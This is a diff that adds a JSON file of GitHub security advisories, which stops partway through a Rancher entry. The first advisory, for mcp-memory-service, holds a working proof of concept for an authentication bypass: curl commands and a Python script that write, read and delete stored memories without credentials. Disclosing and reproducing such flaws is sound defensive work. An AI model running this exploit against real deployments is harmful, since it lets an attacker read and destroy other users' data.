@@ -1,0 +1,1248 @@
+[
+  {
+    "ghsa_id": "GHSA-84hp-mqvj-3p8h",
+    "cve_id": "CVE-2026-50027",
+    "url": "https://api.github.com/advisories/GHSA-84hp-mqvj-3p8h",
+    "html_url": "https://github.com/advisories/GHSA-84hp-mqvj-3p8h",
+    "summary": "mcp-memory-service: Missing Authentication on Document API Endpoints Allows Unauthenticated Memory Read/Write/Delete",
+    "description": "## Missing Authentication on Document API Endpoints Allows Unauthenticated Memory Read/Write/Delete\n\n### Summary\n\nAll HTTP routes under `/api/documents/*` in `mcp-memory-service` are served without any authentication dependency, even when the server is configured with an API key (`MCP_API_KEY`) or OAuth. An unauthenticated remote attacker can upload arbitrary content into the memory store (write), retrieve stored document content (read), and permanently delete memories belonging to authenticated users (delete) — all without supplying any credentials. The `/api/memories` counterpart correctly enforces authentication, making this an inconsistent and exploitable authentication boundary. CVSS 9.8 Critical.\n\n### Details\n\nThe `documents.py` router is instantiated without any router-level `dependencies=` parameter and the file does not import `Depends` at all, so no authentication guard is present on any of its routes:\n\n- **`src/mcp_memory_service/web/api/documents.py:33`** — `from fastapi import APIRouter, UploadFile, File, Form, HTTPException, BackgroundTasks` (`Depends` is absent)\n- **`src/mcp_memory_service/web/api/documents.py:43`** — `router = APIRouter()` (no `dependencies=` argument)\n\nThe affected endpoints and their data-flow sinks are:\n\n| Route | Line (source) | Sink | Line (sink) |\n|---|---|---|---|\n| `POST /upload` | 149 | `storage.store(memory)` | 449 |\n| `POST /batch-upload` | — | `storage.store(memory)` | — |\n| `GET /history` | — | upload metadata response | — |\n| `GET /search-content/{upload_id}` | 729 | memory content response | 781 |\n| `DELETE /remove/{upload_id}` | — | storage deletion | — |\n| `DELETE /remove-by-tags` | 687 | `storage.delete_by_tags(tags)` | 705 |\n\nThe router is mounted in `src/mcp_memory_service/web/app.py:311`:\n\n```python\napp.include_router(documents_router, prefix=\"/api/documents\")\n```\n\nNo `CORSMiddleware` or authentication middleware applies to these routes at mount time.\n\nBy contrast, the equivalent write endpoint in `memories.py` is correctly protected:\n\n```python\n# src/mcp_memory_service/web/api/memories.py:136\nuser: AuthenticationResult = Depends(require_write_access)\n```\n\nThis demonstrates that the authentication infrastructure exists and is intentionally applied elsewhere, but was omitted from all `documents.py` routes.\n\n### PoC\n\n**Prerequisites**\n\n- Docker installed\n- Repository cloned at `repo`\n\n**Build and run the container**\n\n```bash\ndocker build -t vuln-001-mcp-memory-poc \\\n  -f vuln-001/Dockerfile \\\n  repo\n\ndocker run -d --name vuln-001-poc-container \\\n  -p 18000:8000 vuln-001-mcp-memory-poc:latest\n```\n\nThe container starts `mcp-memory-service` with `MCP_API_KEY=poc-secret-key-12345`, simulating a production deployment where the operator has enabled API-key authentication.\n\n**Execute the PoC**\n\n```bash\npython3 vuln-001/poc.py \\\n  --host 127.0.0.1 --port 18000 --api-key poc-secret-key-12345\n```\n\n**Attack chain (6 steps)**\n\n```\n[STEP 1] GET /api/memories (no auth) → HTTP 401   ← auth guard is active on memories API\n[STEP 2] POST /api/memories (with API key) → HTTP 200   ← legitimate user stores sensitive data\n[STEP 3] GET /api/memories (with API key) → HTTP 200  memories_found=1   ← data confirmed\n[STEP 4] POST /api/documents/upload (NO auth) → HTTP 200  upload_id=<uuid>   ← WRITE bypass\n[STEP 5] DELETE /api/documents/remove-by-tags (NO auth) → HTTP 200  memories_deleted=1   ← DELETE bypass\n[STEP 6] GET /api/memories (with API key) → HTTP 200  memories_remaining=0   ← integrity impact confirmed\n```\n\nStep 6 proves that an unauthenticated attacker deleted data created by a legitimately authenticated user in a single unauthenticated request.\n\n**Manual curl equivalent**\n\n```bash\n# Confirm auth guard is active on /api/memories\ncurl -i http://127.0.0.1:18000/api/memories\n# → 401 Unauthorized\n\n# Write through document API — no credentials\nprintf 'CVE_AUTH_BYPASS_MARKER' > /tmp/poc.txt\nUPLOAD_ID=$(\n  curl -s -X POST http://127.0.0.1:18000/api/documents/upload \\\n    -F \"file=@/tmp/poc.txt\" -F \"tags=cve-poc\" |\n  python3 -c 'import sys,json; print(json.load(sys.stdin)[\"upload_id\"])'\n)\n# → 200 OK\n\nsleep 3\ncurl -s \"http://127.0.0.1:18000/api/documents/search-content/$UPLOAD_ID\"\n# → content returned without authentication\n\n# Delete by tag — no credentials\ncurl -i -X DELETE \"http://127.0.0.1:18000/api/documents/remove-by-tags\" \\\n  -H \"Content-Type: application/json\" -d '[\"cve-poc\"]'\n# → 200 OK, memories_deleted=1\n```\n\n**Observed output**\n\n- `GET /api/memories` (no auth) returns `401` — the authentication guard is demonstrably active on the memories API.\n- `POST /api/documents/upload` (no auth) returns `200` with a valid `upload_id`.\n- `DELETE /api/documents/remove-by-tags` (no auth) returns `200` with `memories_deleted=1`.\n- A subsequent authenticated `GET /api/memories` returns `memories_remaining=0`, confirming that legitimately stored data was destroyed by an unauthenticated request.\n\n**Remediation**\n\nAdd `Depends(require_write_access)` / `Depends(require_read_access)` to every affected route in `documents.py`:\n\n```diff\n--- a/src/mcp_memory_service/web/api/documents.py\n+++ b/src/mcp_memory_service/web/api/documents.py\n-from fastapi import APIRouter, UploadFile, File, Form, HTTPException, BackgroundTasks\n+from fastapi import APIRouter, UploadFile, File, Form, HTTPException, BackgroundTasks, Depends\n from ..dependencies import get_storage\n+from ..oauth.middleware import require_read_access, require_write_access, AuthenticationResult\n\n async def upload_document(\n     background_tasks: BackgroundTasks,\n     file: UploadFile = File(...),\n+    user: AuthenticationResult = Depends(require_write_access),\n\n async def batch_upload_documents(\n     background_tasks: BackgroundTasks,\n     files: List[UploadFile] = File(...),\n+    user: AuthenticationResult = Depends(require_write_access),\n\n-async def get_upload_status(upload_id: str):\n+async def get_upload_status(upload_id: str, user: AuthenticationResult = Depends(require_read_access)):\n\n-async def get_upload_history():\n+async def get_upload_history(user: AuthenticationResult = Depends(require_read_access)):\n\n-async def remove_document(upload_id: str, remove_from_memory: bool = True):\n+async def remove_document(upload_id: str, remove_from_memory: bool = True,\n+    user: AuthenticationResult = Depends(require_write_access)):\n\n-async def remove_documents_by_tags(tags: List[str]):\n+async def remove_documents_by_tags(tags: List[str],\n+    user: AuthenticationResult = Depends(require_write_access)):\n\n-async def search_document_content(upload_id: str, limit: int = 1000):\n+async def search_document_content(upload_id: str, limit: int = 1000,\n+    user: AuthenticationResult = Depends(require_read_access)):\n```\n\n### Impact\n\nThis is a **Missing Authentication for Critical Function (CWE-306)** vulnerability affecting the HTTP REST server component of `mcp-memory-service`.\n\n**Who is impacted:** Any operator who deploys the HTTP REST server (`memory server --http`) with `MCP_API_KEY` or OAuth enabled, expecting that only authenticated clients can access stored memories. The HTTP server is documented as a supported production feature for team/multi-client deployments.\n\n**Confidentiality:** An unauthenticated attacker can read recently uploaded document content via `GET /api/documents/search-content/{upload_id}` and enumerate upload history via `GET /api/documents/history`. Stored memories may contain sensitive context such as personal notes, AI agent working state, or proprietary data.\n\n**Integrity:** An unauthenticated attacker can inject arbitrary content into the memory store by uploading documents, polluting the AI agent's knowledge base with attacker-controlled data (memory poisoning / prompt injection surface).\n\n**Availability:** An unauthenticated attacker can delete all memories matching any chosen tags via `DELETE /api/documents/remove-by-tags`, or delete individual documents via `DELETE /api/documents/remove/{upload_id}`, causing permanent loss of stored data.\n\n### Reproduction artifacts\n\n#### `Dockerfile`\n\n```dockerfile\nFROM python:3.12-slim\n\nENV PYTHONDONTWRITEBYTECODE=1\nENV PYTHONUNBUFFERED=1\nENV HF_HOME=/root/.cache/huggingface\n\nWORKDIR /app\n\nRUN apt-get update && apt-get install -y --no-install-recommends \\\n build-essential \\\n && rm -rf /var/lib/apt/lists/*\n\n# Install CPU-only torch first to avoid pulling the large CUDA wheel from PyPI\nRUN pip install --no-cache-dir \\\n \"torch>=2.0.0\" \\\n --index-url https://download.pytorch.org/whl/cpu\n\n# Copy and install the mcp-memory-service from the local repo\nCOPY . /app\nRUN pip install --no-cache-dir -e .\n\n# Pre-download the sentence-transformers embedding model so the container\n# can run fully offline and starts quickly\nRUN python -c \"from sentence_transformers import SentenceTransformer; m = SentenceTransformer('all-MiniLM-L6-v2'); v = m.encode(['preflight']); print('Embedding model ready, dim=' + str(len(v[0])))\"\n\n# ── Runtime config ──────────────────────────────────────────────────────────\n# MCP_API_KEY is set to simulate a production deployment where the operator\n# has enabled API-key authentication. The bug is that /api/documents/* routes\n# ignore this key entirely.\nENV MCP_API_KEY=poc-secret-key-12345\nENV MCP_MEMORY_STORAGE_BACKEND=sqlite_vec\nENV MCP_HTTP_PORT=8000\nENV MCP_HTTP_HOST=0.0.0.0\nENV MCP_MDNS_ENABLED=false\nENV MCP_CONSOLIDATION_ENABLED=false\nENV MCP_BACKUP_ENABLED=false\nENV MCP_QUALITY_SYSTEM_ENABLED=false\n# Prevent any outbound HuggingFace requests at runtime\nENV TRANSFORMERS_OFFLINE=1\nENV HF_DATASETS_OFFLINE=1\n\nEXPOSE 8000\n\nCMD [\"python\", \"run_server.py\"]\n```\n\n#### `poc.py`\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC – VULN-001: Missing Authentication on Document API Endpoints\nCWE-306 Missing Authentication for Critical Function\nCVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\n\nAttack chain:\n 1. GET /api/memories (no auth) → 401 (auth guard confirmed active)\n 2. POST /api/memories (with API key) → 200 (legitimate write)\n 3. GET /api/memories (with API key) → 200 (data exists)\n 4. POST /api/documents/upload (NO auth!) → 200 (write bypass)\n 5. DELETE /api/documents/remove-by-tags (NO auth!) → 200 (delete bypass)\n 6. GET /api/memories (with API key) → memory is GONE\n\nStep 6 proves an unauthenticated attacker destroyed data created by a\nlegitimate, authenticated user — confirming full integrity impact.\n\nUsage:\n python3 poc.py [--host 127.0.0.1] [--port 8000] [--api-key poc-secret-key-12345]\n\"\"\"\n\nimport sys\nimport time\nimport json\nimport uuid\nimport argparse\nimport http.client\n\nMARKER = \"VULN001_AUTH_BYPASS_\" + uuid.uuid4().hex[:12].upper()\nTARGET_TAG = f\"vuln001-target-{uuid.uuid4().hex[:6]}\"\n\n\n# ─── low-level helpers ───────────────────────────────────────────────────────\n\ndef http_req(host, port, method, path, body=None, headers=None, timeout=20):\n conn = http.client.HTTPConnection(host, port, timeout=timeout)\n h = dict(headers or {})\n conn.request(method, path, body=body, headers=h)\n resp = conn.getresponse()\n return resp.status, resp.read().decode(\"utf-8\", errors=\"replace\")\n\n\ndef wait_ready(host, port, timeout=120):\n print(f\"[*] Waiting for server at {host}:{port} …\", flush=True)\n deadline = time.time() + timeout\n while time.time() < deadline:\n try:\n s, _ = http_req(host, port, \"GET\", \"/api/health\", timeout=2)\n if s == 200:\n print(\"[+] Server ready\\n\", flush=True)\n return True\n except Exception:\n pass\n time.sleep(1)\n return False\n\n\ndef build_multipart(boundary, filename, file_bytes, tags_str):\n b = boundary.encode()\n return b\"\".join([\n b\"--\" + b + b\"\\r\\n\",\n b'Content-Disposition: form-data; name=\"file\"; filename=\"' + filename.encode() + b'\"\\r\\n',\n b\"Content-Type: /plain\\r\\n\\r\\n\",\n file_bytes,\n b\"\\r\\n--\" + b + b\"\\r\\n\",\n b'Content-Disposition: form-data; name=\"tags\"\\r\\n\\r\\n',\n tags_str.encode(),\n b\"\\r\\n--\" + b + b\"--\\r\\n\",\n ])\n\n\n# ─── individual test steps ───────────────────────────────────────────────────\n\ndef step_memories_no_auth(host, port):\n \"\"\"GET /api/memories without auth must return 401.\"\"\"\n print(\"[STEP 1] GET /api/memories (no auth — expect 401)\", flush=True)\n status, body = http_req(host, port, \"GET\", \"/api/memories\")\n ok = (status == 401)\n print(f\" {'PASS' if ok else 'FAIL'} HTTP {status}\", flush=True)\n return ok, status\n\n\ndef step_store_memory_with_auth(host, port, api_key):\n \"\"\"POST /api/memories with API key — store a 'legitimate' memory.\"\"\"\n print(f\"[STEP 2] POST /api/memories (with API key, tag={TARGET_TAG})\", flush=True)\n payload = json.dumps({\n \"content\": f\"Sensitive memory — {MARKER}\",\n \"tags\": [TARGET_TAG, \"vuln001-demo\"],\n \"memory_type\": \"observation\",\n \"metadata\": {\"poc\": \"VULN-001\"}\n }).encode()\n headers = {\n \"Content-Type\": \"application/json\",\n \"Content-Length\": str(len(payload)),\n \"X-API-Key\": api_key,\n }\n status, body = http_req(host, port, \"POST\", \"/api/memories\", payload, headers)\n ok = status in (200, 201)\n content_hash = None\n try:\n content_hash = json.loads(body).get(\"content_hash\")\n except Exception:\n pass\n print(f\" {'PASS' if ok else 'FAIL'} HTTP {status} hash={content_hash}\", flush=True)\n if not ok:\n print(f\" body: {body[:300]}\", flush=True)\n return ok, status, content_hash\n\n\ndef step_verify_memory_exists(host, port, api_key):\n \"\"\"GET /api/memories with auth — confirm the memory is stored.\"\"\"\n print(\"[STEP 3] GET /api/memories (with API key — confirm data exists)\", flush=True)\n headers = {\"X-API-Key\": api_key}\n status, body = http_req(host, port, \"GET\", f\"/api/memories?tags={TARGET_TAG}\", headers=headers)\n ok = status == 200\n count = 0\n try:\n data = json.loads(body)\n count = data.get(\"total\", len(data.get(\"memories\", [])))\n except Exception:\n pass\n print(f\" {'PASS' if ok else 'FAIL'} HTTP {status} memories_found={count}\", flush=True)\n return ok, status, count\n\n\ndef step_upload_no_auth(host, port):\n \"\"\"POST /api/documents/upload without any credentials — should return 200.\"\"\"\n print(\"[STEP 4] POST /api/documents/upload (NO auth — expect 200)\", flush=True)\n boundary = \"PocBoundary\" + uuid.uuid4().hex\n payload = f\"EVIDENCE: {MARKER}\\nUploaded without authentication — VULN-001.\\n\".encode()\n body = build_multipart(boundary, \"poc_vuln001.txt\", payload, \"poc-evidence,vuln001-demo\")\n headers = {\n \"Content-Type\": f\"multipart/form-data; boundary={boundary}\",\n \"Content-Length\": str(len(body)),\n }\n status, resp = http_req(host, port, \"POST\", \"/api/documents/upload\", body, headers)\n upload_id = None\n try:\n upload_id = json.loads(resp).get(\"upload_id\")\n except Exception:\n pass\n ok = status == 200 and upload_id is not None\n print(f\" {'PASS' if ok else 'FAIL'} HTTP {status} upload_id={upload_id}\", flush=True)\n if not ok:\n print(f\" body: {resp[:300]}\", flush=True)\n return ok, status, upload_id\n\n\ndef step_delete_no_auth(host, port):\n \"\"\"DELETE /api/documents/remove-by-tags without auth — should return 200.\"\"\"\n print(f\"[STEP 5] DELETE /api/documents/remove-by-tags (NO auth, tag={TARGET_TAG})\", flush=True)\n # FastAPI 0.100+ treats List[str] in DELETE as request body (JSON array)\n body = json.dumps([TARGET_TAG, \"vuln001-demo\"]).encode()\n headers = {\n \"Content-Type\": \"application/json\",\n \"Content-Length\": str(len(body)),\n }\n status, resp = http_req(\n host, port, \"DELETE\", \"/api/documents/remove-by-tags\",\n body=body, headers=headers\n )\n ok = status == 200\n deleted = 0\n try:\n deleted = json.loads(resp).get(\"memories_deleted\", 0)\n except Exception:\n pass\n print(f\" {'PASS' if ok else 'FAIL'} HTTP {status} memories_deleted={deleted}\", flush=True)\n if not ok:\n print(f\" body: {resp[:300]}\", flush=True)\n return ok, status, deleted\n\n\ndef step_verify_memory_gone(host, port, api_key):\n \"\"\"GET /api/memories with auth — confirm attacker wiped the data.\"\"\"\n print(\"[STEP 6] GET /api/memories (with API key — verify data was deleted)\", flush=True)\n headers = {\"X-API-Key\": api_key}\n status, body = http_req(host, port, \"GET\", f\"/api/memories?tags={TARGET_TAG}\", headers=headers)\n ok = status == 200\n count = 0\n try:\n data = json.loads(body)\n count = data.get(\"total\", len(data.get(\"memories\", [])))\n except Exception:\n pass\n data_deleted = (ok and count == 0)\n print(f\" {'PASS' if data_deleted else 'NOTE'} HTTP {status} memories_remaining={count}\", flush=True)\n if data_deleted:\n print(\" [+] Memory wiped by unauthenticated attacker — integrity impact confirmed!\", flush=True)\n return ok, status, count\n\n\n# ─── main ────────────────────────────────────────────────────────────────────\n\ndef main():\n ap = argparse.ArgumentParser(description=\"VULN-001 PoC — CWE-306 auth bypass\")\n ap.add_argument(\"--host\", default=\"127.0.0.1\")\n ap.add_argument(\"--port\", type=int, default=8000)\n ap.add_argument(\"--api-key\", default=\"poc-secret-key-12345\",\n help=\"API key configured on the server (simulates legitimate user)\")\n args = ap.parse_args()\n\n print(\"=\" * 65)\n print(\"VULN-001 Missing Authentication on Document API Endpoints\")\n print(\"CWE-306 / CVSS 9.8 (Critical)\")\n print(\"=\" * 65 + \"\\n\")\n\n if not wait_ready(args.host, args.port):\n print(\"[-] Server did not become ready\", flush=True)\n sys.exit(2)\n\n r = {}\n\n # Step 1 — baseline: auth IS enforced on /api/memories\n ok1, s1 = step_memories_no_auth(args.host, args.port)\n r[\"step1_auth_guard_active\"] = {\n \"pass\": ok1,\n \"evidence\": f\"GET /api/memories (no auth) → HTTP {s1}\"\n }\n\n # Step 2 — legitimate user stores a sensitive memory\n ok2, s2, content_hash = step_store_memory_with_auth(args.host, args.port, args.api_key)\n r[\"step2_legitimate_write\"] = {\n \"pass\": ok2,\n \"evidence\": f\"POST /api/memories (with API key) → HTTP {s2}\"\n }\n\n # Step 3 — confirm memory exists\n ok3, s3, mem_count = step_verify_memory_exists(args.host, args.port, args.api_key)\n r[\"step3_data_present\"] = {\n \"pass\": ok3 and mem_count > 0,\n \"evidence\": f\"GET /api/memories (with API key) → HTTP {s3}, count={mem_count}\"\n }\n\n # Step 4 — attacker uploads without auth (WRITE bypass)\n ok4, s4, upload_id = step_upload_no_auth(args.host, args.port)\n r[\"step4_upload_auth_bypass\"] = {\n \"pass\": ok4,\n \"evidence\": f\"POST /api/documents/upload (NO auth) → HTTP {s4}\"\n }\n\n # Step 5 — attacker deletes WITHOUT auth (DELETE bypass)\n ok5, s5, deleted = step_delete_no_auth(args.host, args.port)\n r[\"step5_delete_auth_bypass\"] = {\n \"pass\": ok5,\n \"evidence\": f\"DELETE /api/documents/remove-by-tags (NO auth) → HTTP {s5}, deleted={deleted}\"\n }\n\n # Step 6 — verify legitimate data is gone\n ok6, s6, remaining = step_verify_memory_gone(args.host, args.port, args.api_key)\n r[\"step6_integrity_impact\"] = {\n \"pass\": ok6 and remaining == 0,\n \"evidence\": f\"GET /api/memories (with API key) after attack → count={remaining} (was {mem_count})\"\n }\n\n print(\"\\n\" + \"=\" * 65)\n print(\"RESULTS SUMMARY\")\n print(\"=\" * 65)\n for k, v in r.items():\n sym = \"PASS\" if v[\"pass\"] else \"FAIL\"\n print(f\" [{sym}] {v['evidence']}\", flush=True)\n\n # Core bypass: /api/memories returns 401 BUT /api/documents/* returns 200 without auth\n bypass_proven = ok1 and ok4\n delete_bypass = ok1 and ok5\n\n print(\"\\nKey evidence:\")\n print(f\" Auth guard ACTIVE : GET /api/memories (no auth) → HTTP {s1}\")\n print(f\" Write BYPASS : POST /api/documents/upload (no auth) → HTTP {s4}\")\n print(f\" Delete BYPASS : DELETE /api/documents/remove-by-tags (no auth) → HTTP {s5}\")\n\n overall = \"PASS – auth bypass confirmed\" if (bypass_proven or delete_bypass) else \"FAIL\"\n print(f\"\\nVerdict: {overall}\")\n print(\"=\" * 65)\n sys.exit(0 if (bypass_proven or delete_bypass) else 1)\n\n\nif __name__ == \"__main__\":\n main()\n```",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/doobidoo/mcp-memory-service/security-advisories/GHSA-84hp-mqvj-3p8h",
+    "source_code_location": "https://github.com/doobidoo/mcp-memory-service",
+    "identifiers": [
+      {
+        "value": "GHSA-84hp-mqvj-3p8h",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-50027",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/doobidoo/mcp-memory-service/security/advisories/GHSA-84hp-mqvj-3p8h",
+      "https://github.com/advisories/GHSA-84hp-mqvj-3p8h"
+    ],
+    "published_at": "2026-07-02T15:26:23Z",
+    "updated_at": "2026-07-02T15:26:24Z",
+    "github_reviewed_at": "2026-07-02T15:26:23Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "mcp-memory-service"
+        },
+        "vulnerable_version_range": "< 10.67.1",
+        "first_patched_version": "10.67.1",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 9.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-306",
+        "name": "Missing Authentication for Critical Function"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "EQSTLab",
+          "id": 148991397,
+          "node_id": "U_kgDOCOFtpQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/148991397?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/EQSTLab",
+          "html_url": "https://github.com/EQSTLab",
+          "followers_url": "https://api.github.com/users/EQSTLab/followers",
+          "following_url": "https://api.github.com/users/EQSTLab/following{/other_user}",
+          "gists_url": "https://api.github.com/users/EQSTLab/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/EQSTLab/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/EQSTLab/subscriptions",
+          "organizations_url": "https://api.github.com/users/EQSTLab/orgs",
+          "repos_url": "https://api.github.com/users/EQSTLab/repos",
+          "events_url": "https://api.github.com/users/EQSTLab/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/EQSTLab/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "score": 9.8
+    }
+  },
+  {
+    "ghsa_id": "GHSA-62q6-4hv4-vjrw",
+    "cve_id": "CVE-2026-53943",
+    "url": "https://api.github.com/advisories/GHSA-62q6-4hv4-vjrw",
+    "html_url": "https://github.com/advisories/GHSA-62q6-4hv4-vjrw",
+    "summary": "Ghost: Cache-poisoning XSS in Ghost frontend via x-ghost-preview header",
+    "description": "### Impact\n\nWhen Ghost is behind a shared caching layer that results in cached content being shared between different visitors (e.g., Fastly, Cloudflare, nginx proxy_cache, and others), an unauthenticated user could send an `x-ghost-preview` header that altered the rendered frontend response. In affected cache configurations, that response could be stored and served to subsequent visitors requesting the same page, allowing cache poisoning of request-specific preview output. \n\nWhen running Ghost's frontend and admin panel on the same domain this could be used to take over staff user accounts. When running these on different domains staff accounts have no exposure. \n\n### Vulnerable versions\n\nThis vulnerability is present in Ghost from v4.0 up to v6.36.0.\n\n### Patches\n\nv6.37.0 contains a fix for this issue.\n\n### How to update\n\nFor self-hosters using Docker, find [Docker's official Ghost image here](https://hub.docker.com/_/ghost). Updating a Docker-based Ghost instance [is documented here](https://docs.ghost.org/install/docker#updating-ghost).\n\nIf your Ghost is a Ghost-CLI install see our documentation on [updating it to the latest version here](https://docs.ghost.org/update).\n\nIf you suspect a credential compromise, use the “Reset all authentication” dialogue under Settings / Danger Zone. This is available starting with Ghost v6.41.0. \n\n### Workarounds\n\nAt the caching layer, bypass the cache for `x-ghost-preview` requests. \n\n### References\n\nGhost thanks [CryptoCat](https://linkedin.com/in/cryptocat) for disclosing this vulnerability responsibly.\n\n### For more information\n\nIf you have any questions or comments about this advisory, email us at [security@ghost.org](mailto:security@ghost.org).",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/TryGhost/Ghost/security-advisories/GHSA-62q6-4hv4-vjrw",
+    "source_code_location": "https://github.com/TryGhost/Ghost",
+    "identifiers": [
+      {
+        "value": "GHSA-62q6-4hv4-vjrw",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-53943",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/TryGhost/Ghost/security/advisories/GHSA-62q6-4hv4-vjrw",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-53943",
+      "https://github.com/advisories/GHSA-62q6-4hv4-vjrw"
+    ],
+    "published_at": "2026-07-01T21:58:32Z",
+    "updated_at": "2026-07-01T21:58:34Z",
+    "github_reviewed_at": "2026-07-01T21:58:32Z",
+    "nvd_published_at": "2026-06-24T19:17:11Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "ghost"
+        },
+        "vulnerable_version_range": ">= 4.0.0, <= 6.36.0",
+        "first_patched_version": "6.37.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+        "score": 9.6
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-524",
+        "name": "Use of Cache Containing Sensitive Information"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "Crypto-Cat",
+          "id": 12751872,
+          "node_id": "MDQ6VXNlcjEyNzUxODcy",
+          "avatar_url": "https://avatars.githubusercontent.com/u/12751872?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Crypto-Cat",
+          "html_url": "https://github.com/Crypto-Cat",
+          "followers_url": "https://api.github.com/users/Crypto-Cat/followers",
+          "following_url": "https://api.github.com/users/Crypto-Cat/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Crypto-Cat/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Crypto-Cat/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Crypto-Cat/subscriptions",
+          "organizations_url": "https://api.github.com/users/Crypto-Cat/orgs",
+          "repos_url": "https://api.github.com/users/Crypto-Cat/repos",
+          "events_url": "https://api.github.com/users/Crypto-Cat/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Crypto-Cat/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+      "score": 9.6
+    },
+    "epss": {
+      "percentage": 0.00244,
+      "percentile": 0.15529
+    }
+  },
+  {
+    "ghsa_id": "GHSA-vx8h-4prv-g744",
+    "cve_id": "CVE-2026-41052",
+    "url": "https://api.github.com/advisories/GHSA-vx8h-4prv-g744",
+    "html_url": "https://github.com/advisories/GHSA-vx8h-4prv-g744",
+    "summary": "Rancher has Privilege Escalation from Project Owner to Host",
+    "description": "### Impact\n\nA vulnerability has been identified in Rancher Manager that allows users assigned the Project Owner role to modify Pod Security Admission (PSA) labels on namespaces within their projects. Under the default role configuration, an attacker with the following access pattern can exploit this issue:\n1. **Cluster Access:** The user is granted Cluster Member access.\n2. **Project Ownership:** The user creates or is assigned ownership of a project.\n3. **Namespace Creation:** The user creates a namespace within that project.\n4. **PSA Modification:** The user modifies the namespace PSA configuration to use the privileged profile.\n5. **Privilege Escalation:** The user deploys privileged workloads within the namespace.\n\nAs outlined in the [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/) documentation, `privileged` containers disable core Kubernetes security protections, allowing workloads to bypass standard container isolation boundaries. This can result in privilege escalation within the cluster environment.\n\nPotential impacts include:\n- Deployment of privileged containers\n- Access to host-level resources\n- Container breakout\n- Cluster privilege escalation\n- Compromise of workloads running on affected nodes\n\nPlease refer to the associated MITRE ATT&CK techniques for further information about this category of attack:\n- [Deploy Container](https://attack.mitre.org/techniques/T1610/)\n- [Escape to Host](https://attack.mitre.org/techniques/T1611/)\n- [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)\n\nReference:\n[Kubernetes Pod Security Standards — Privileged Profile](https://kubernetes.io/docs/concepts/security/pod-security-standards/#privileged)\n\n### Patches\nThis vulnerability is resolved by modifying the `project-owner` role to explicitly define the allowed verbs for `projects` resources instead of using the wildcard `(*)` permission.\n\nThe updated role configuration removes access to the `updatepsa` verb. This prevents project owners from modifying PSA settings in a manner that could enable privilege escalation.\n\nPatched versions of Rancher include releases `v2.12.10`, `v2.13.6`, and `v2.14.2`.\n\n### Workarounds\nIf upgrading is not immediately possible, administrators should create a custom project role based on the existing Project Owner role, while removing unrestricted wildcard permissions for project resources.\n\nThe allowed verbs for projects should be restricted to: “`get`, `update`, `delete`, `patch`, `create`, `list`, `watch`, `deletecollection`” instead of “`*`”.\n\nThis prevents access to the `updatepsa` capability that enables the privilege escalation path.\n\n### References\nIf you have any questions or comments about this advisory:\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/rancher/rancher/security-advisories/GHSA-vx8h-4prv-g744",
+    "source_code_location": "https://github.com/rancher/rancher",
+    "identifiers": [
+      {
+        "value": "GHSA-vx8h-4prv-g744",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-41052",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/rancher/rancher/security/advisories/GHSA-vx8h-4prv-g744",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-41052",
+      "https://github.com/rancher/rancher/pull/55061",
+      "https://github.com/rancher/rancher/commit/2800aaac25b5a2c448f800e1f46d",
